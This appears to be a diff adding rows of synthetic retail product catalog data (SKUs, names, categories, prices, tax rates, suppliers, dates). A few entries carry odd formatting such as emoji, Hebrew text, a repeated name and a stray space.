+SW-BEV-00080,Pure Choice Cola Drink 2L,Beverages,67,54,12,SUP20,ACTIVE,15,2024-10-08
+SW-ELE-00024,Royal Harvest Earphones basic ⭐⭐⭐,Electronics Accessories,225,175,0,SUP09,ACTIVE,8,2024-01-26
+SW-HOM-00041,Home Basics Dishwash Liquid 250ml,Household,160,127,5,SUP16,ACTIVE,10,2025-03-12
+SW-GRO-00044,Green Leaf Atta 1kg,Grocery,126,106,18,SUP11,ACTIVE,8,2024-05-13
+SW-GRO-00049,Metro Choice Tea Leaves 250g,Grocery,263,197,12,SUP13,ACTIVE,8,2025-04-28
+SW-STA-00018,Green Leaf Notebook 300 pages,Stationery,48,40,18,SUP05,ACTIVE,12,2025-07-23
+SW-PER-00053,Pure Choice Bathing Soap 75g,Personal Care,122,100,18,SUP04,ACTIVE,8,2025-11-27
+SW-BEV-00037,Fresh Basket Energy Drink 250ml,Beverages,98,68,12,SUP21,ACTIVE,5,2024-09-20
+SW-GRO-00018,Star Select Basmati Rice 1kg,Grocery,647,448,12,SUP19,ACTIVE,12,2025-12-21
+SW-GRO-00204,Metro Choice Besan 1kg,Grocery,88,73,18,SUP19,ACTIVE,15,2025-07-07
+SW-GRO-00202,Pure Choice Atta 10kg,Grocery,305,218,12,SUP11,ACTIVE,15,2025-01-04
+SW-STA-00031,Kitchen Pride A4 Paper 100 sheets,Stationery,92,75,18,SUP07,ACTIVE,5,2024-04-06
+SW-BEV-00047,Value Pack Mineral Water 1L,Beverages,103,81,12,SUP09,ACTIVE,12,2025-07-24
+SW-GRO-00050,Prime Select Poha 1kg,Grocery,71,58,5,SUP15,ACTIVE,5,2025-07-18
+SW-ELE-00075,Everyday USB Cable 1m,Electronics Accessories,402,320,0,SUP11,ACTIVE,12,2024-02-17
+SW-BEV-00096,Green Leaf Orange Juice 200ml,Beverages,43,34,0,SUP21,ACTIVE,20,2025-08-03
+SW-ELE-00069,Everyday Earphones basic,Electronics Accessories,739,560,18,SUP03,ACTIVE,20,2024-03-25
+SW-PER-00074,Daily Fresh Face Wash 100ml,Personal Care,236,164,18,SUP14,ACTIVE,10,2025-04-11
+SW-GRO-00131,Value Pack Sunflower Oil 1L,Grocery,670,557,5,SUP02,ACTIVE,8,2025-03-17
+SW-HOM-00073,Pure Choice Garbage Bags 90 pcs,Household,182,138,18,SUP10,ACTIVE,5,2025-05-20
+SW-STA-00022,Smart Buy A4 Paper 500 sheets,Stationery,349,280,12,SUP07,ACTIVE,10,2025-07-02
+SW-SNK-00026,Everyday Potato Chips 150g,Snacks,36,27,12,SUP02,ACTIVE,5,2025-10-20
+SW-HOM-00029,Home Basics Phenyl 1L,Household,137,99,0,SUP02,ACTIVE,25,2025-10-25
+SW-ELE-00074,Prime Select LED Bulb 12W,Electronics Accessories,144,116,5,SUP25,ACTIVE,25,2024-09-22
+SW-GRO-00186,Kitchen Pride Atta 10kg,Grocery,502,403,5,SUP07,ACTIVE,15,2025-01-21
+SW-HOM-00090,Value Pack Detergent Powder 1kg,Household,321,224,0,SUP25,ACTIVE,8,2024-08-17
+SW-GRO-00009,Metro Choice Basmati Rice 1kg,Grocery,630,453,12,SUP04,ACTIVE,20,2025-09-21
+SW-ELE-00061,Star Select USB Cable 1m,Electronics Accessories,378,318,0,SUP09,ACTIVE,25,2025-02-18
+SW-ELE-00046,Fresh Basket AA Batteries 10 pack,Electronics Accessories,132,104,12,SUP12,ACTIVE,25,2024-04-28
+SW-HOM-00083,Royal Harvest Floor Cleaner 500ml,Household,330,232,0,SUP25,ACTIVE,10,2025-07-10
+SW-STA-00030,Green Leaf Sticky Notes 100 sheets,Stationery,93,69,12,SUP22,ACTIVE,10,2025-04-04
+SW-BEV-00054,Green Leaf Cola Drink 2L,Beverages,97,69,12,SUP02,ACTIVE,15,2024-09-21
+SW-SNK-00011,Star Select Chocolate Bar 40g,Snacks,62,46,0,SUP12,ACTIVE,25,2024-06-08
+SW-GRO-00090,Home Basics Toor Dal 500g,Grocery,91,62,0,SUP08,ACTIVE,15,2024-01-17
+SW-ELE-00087,Home Basics Power Bank 10000mAh,Electronics Accessories,1412,1081,18,SUP09,ACTIVE,5,2024-06-12
+SW-PER-00095,Fresh Basket Shampoo 180ml מוצר לדוגמה,Personal Care,506,384,5,SUP06,ACTIVE,20,2024-01-21
+SW-GRO-00191,Metro Choice Sugar 1kg,Grocery,78,60,12,SUP25,ACTIVE,12,2024-08-05
+SW-SNK-00004,Kitchen Pride Potato Chips 150g,Snacks,47,35,12,SUP02,ACTIVE,8,2025-10-02
+SW-PER-00056,Green Leaf Bathing Soap 3 pack,Personal Care,71,52,18,SUP06,ACTIVE,5,2025-04-26
+SW-BEV-00041,Royal Harvest Energy Drink 250ml,Beverages,98,80,12,SUP04,ACTIVE,15,2024-03-08
+SW-GRO-00069,Home Basics Sugar 1kg,Grocery,280,213,0,SUP19,ACTIVE,5,2024-05-02
+SW-BEV-00059,Everyday Energy Drink 250ml,Beverages,116,82,18,SUP03,ACTIVE,10,2024-04-22
+SW-STA-00010,Royal Harvest Notebook 300 pages,Stationery,100,78,18,SUP05,ACTIVE,8,2024-12-25
+SW-HOM-00015,Daily Fresh Garbage Bags 90 pcs,Household,82,61,5,SUP15,ACTIVE,10,2024-07-02
+SW-ELE-00014,Green Leaf AA Batteries 4 pack,Electronics Accessories,202,168,18,SUP02,ACTIVE,12,2024-09-14
+SW-PER-00060,Smart Buy Toothpaste 200g Smart Buy Toothpaste 200g Smart Buy Toothpaste 200g Smart Buy Toothpaste 200g Smart Buy Toothpaste 200g Smart Buy Toothpaste 200g Smart Buy Toothpaste 200g Smart Buy Toothpaste 200g Smart Buy Toothpaste 200g Smart Buy Toothpaste 200g Smart Buy Toothpaste 200g Smart Buy Toothpaste 200g ,Personal Care,103,72,5,SUP08,ACTIVE,5,2025-04-05
+SW-ELE-00023,Star Select LED Bulb 9W,Electronics Accessories,203,142,0,SUP19,ACTIVE,20,2025-06-14
+SW-SNK-00001,Royal Harvest Potato Chips 50g,Snacks,33,23,0,SUP05,ACTIVE,20,2025-09-04
+SW-SNK-00014,Metro Choice Namkeen Mix 400g,Snacks,117,86,0,SUP20,ACTIVE,8,2025-06-12
+SW-HOM-00059 ,Fresh Basket Garbage Bags 90 pcs,Household,141,107,5,SUP04,ACTIVE,8,2024-03-04
+SW-ELE-00032,Smart Buy LED Bulb 12W,Electronics Accessories,173,127,5,SUP19,ACTIVE,8,2025-09-10
+SW-ELE-00035,Home Basics Earphones basic,Electronics Accessories,222,160,0,SUP24,ACTIVE,5,2024-07-15
+SW-ELE-00010,Home Basics USB Cable 1m,Electronics Accessories,155,113,5,SUP11,ACTIVE,25,2025-04-08
+SW-HOM-00055,Fresh Basket Dishwash Liquid 250ml,Household,141,100,18,SUP19,ACTIVE,15,2025-06-06
+SW-STA-00004,Value Pack Notebook 180 pages,Stationery,110,76,5,SUP18,ACTIVE,8,2025-08-12
+SW-GRO-00019,Pure Choice Atta 1kg,Grocery,341,238,0,SUP11,ACTIVE,8,2025-12-12
+SW-PER-00076,Green Leaf Toothpaste 100g,Personal Care,159,133,12,SUP08,ACTIVE,8,2025-07-22
+SW-GRO-00014,Star Select Besan 1kg,Grocery,157,121,5,SUP14,ACTIVE,12,2024-07-11
+SW-GRO-00133,Pure Choice Tea Leaves 500g,Grocery,308,240,0,SUP03,ACTIVE,12,2024-10-18
+SW-PER-00020,Smart Buy Hand Wash 750ml,Personal Care,229,190,5,SUP07,ACTIVE,5,2024-10-02
